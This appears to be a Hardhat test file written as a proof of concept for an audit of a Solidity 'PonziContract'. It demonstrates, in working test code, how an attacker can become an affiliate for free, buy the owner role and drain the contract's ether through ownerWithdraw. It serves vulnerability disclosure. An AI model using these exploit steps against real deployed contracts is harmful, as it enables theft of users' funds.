import {expect} from "chai";
import { ethers } from "hardhat";
import {loadFixture, time} from "@nomicfoundation/hardhat-network-helpers";


describe("Vulnerabilities PoC", function () {
    async function deployFixture() {
        const [
            owner,
            address1,
            address2,
            address3,
            address4,
            address5
        ] = await ethers.getSigners();

        const contract = await ethers.deployContract("PonziContract");
        await contract.waitForDeployment();

        return {contract, owner, address1, address2, address3, address4, address5};
    }

    /**
     * Here is the description of all bugs that I found
     */
    describe("Critical vulnerabilities ", function () {

        /**
         * We can become an Affiliate for free. If we do that, we can buy (or use another bug) contact ownership and
         * withdraw all the funds from it.
         */
        it("Become an Affiliate for free", async function () {
            const {
                contract, owner,
                address1,
                address2,
                address3,
                address4,
            } = await loadFixture(deployFixture);

            /**
             * First let's check, that we cannot use the `buyOwnerRole` contact function without being an Affiliate and
             * that we cannot use `joinPonzi function with 0 deadline value`
             */

            const tx1 = contract.connect(address3).buyOwnerRole(address3.address, {value: 0});
            await expect(tx1).to.be.revertedWith("Not an Affiliate!");

            const tx2 = contract.connect(address3).joinPonzi([], {value: 0});
            await expect(tx2).to.be.revertedWith("Registration not Active!");

            /**
             * Now let's imagine the hardest case - owner added two new affiliate to the smart contract and set new
             * deadline (that allows us to use the `joinPonzi` function)
             */

            await contract.addNewAffilliate(address1);
            await contract.addNewAffilliate(address2);

            const deadline = await time.latest() + 1000;
            await contract.setDeadline(deadline);

            /**
             * The `affiliatesCount` contact storage value now equals 2, and we need to add a list of two addresses as
             * an argument. Also wee need to add `1 eth * affiliatesCount` value.
             *
             * One address will be our own address and another can be any (for example, it also can be our address)
             *
             * At the end we will transfer 1 eth to our second address and become an Affiliate
             */

            const value = ethers.parseEther('2');

            /**
             * We could do just [address3, address3]
             */
            const tx3 = contract.connect(address3).joinPonzi([address3, address4], {value});
            await expect(tx3).to.changeEtherBalances(
                [address3, address4],
                [ethers.parseEther('-1'), ethers.parseEther('1')]
            );

            /**
             * Now let's check that we have a possibility to use `buyOwnerRole` function. It should revert with
             * `Invalid Ether amount` reason
             */

            const tx4 = contract.connect(address3).buyOwnerRole(address3.address, {value: 0});
            await expect(tx4).to.be.revertedWith("Invalid Ether amount");
        });

        /**
         * We can become a contract owner for free and withdraw all the funds from the contract to any other address
         */
        it("Become a contract owner for free", async function () {
            const {
                contract, owner,
                address1,
            } = await loadFixture(deployFixture);

            /**
             * Let's imagine, that contract owner transferred 10 eth to the contract (for more drama)
             */

            await owner.sendTransaction({
                to: contract.target,
                value: ethers.parseEther('10')
            });

            /**
             * After deadline is set we can use the simple way to become an Affiliate - send to `joinPonzi` function
             * empty array and 0 value
             */

            const deadline = await time.latest() + 1000;
            await contract.setDeadline(deadline);

            await contract.connect(address1).joinPonzi([]);

            /**
             * let's check that we have a possibility to use `buyOwnerRole` function. It should revert with
             * `Invalid Ether amount` reason
             */

            const tx1 = contract.connect(address1).buyOwnerRole(address1.address, {value: 0});
            await expect(tx1).to.be.revertedWith("Invalid Ether amount");

            /**
             * Now we can call `butOwnerRole` function sending 10 eth, but as we see, 10 eth will be stored on the
             * contract balance, not on the owners balance
             */

            const value = ethers.parseEther('10');
            const tx2 = contract.connect(address1).buyOwnerRole(address1.address, {value});
            await expect(tx2).to.changeEtherBalances(
                [address1, contract],
                [ethers.parseEther('-10'), ethers.parseEther('10')]
            );

            /**
             * At the end we call the `ownerWithdraw` function and withdraw all the funds to our wallet
             */

            const tx3 = contract.connect(address1)
                .ownerWithdraw(address1.address, ethers.parseEther('20'));
            await expect(tx3).to.changeEtherBalances(
                [contract, address1],
                [ethers.parseEther('-20'), ethers.parseEther('20')]
            );
        });
    });

    describe("Deployment unit tests", function () {
        it("Should set the right owner", async function () {
            const {contract, owner} = await loadFixture(deployFixture);

            expect(await contract.owner()).to.equal(owner.address);
        });

        it("Should deploy with proper address", async function () {
            const {contract} = await loadFixture(deployFixture);

            expect(contract.target).to.be.properAddress;
        });
    });
})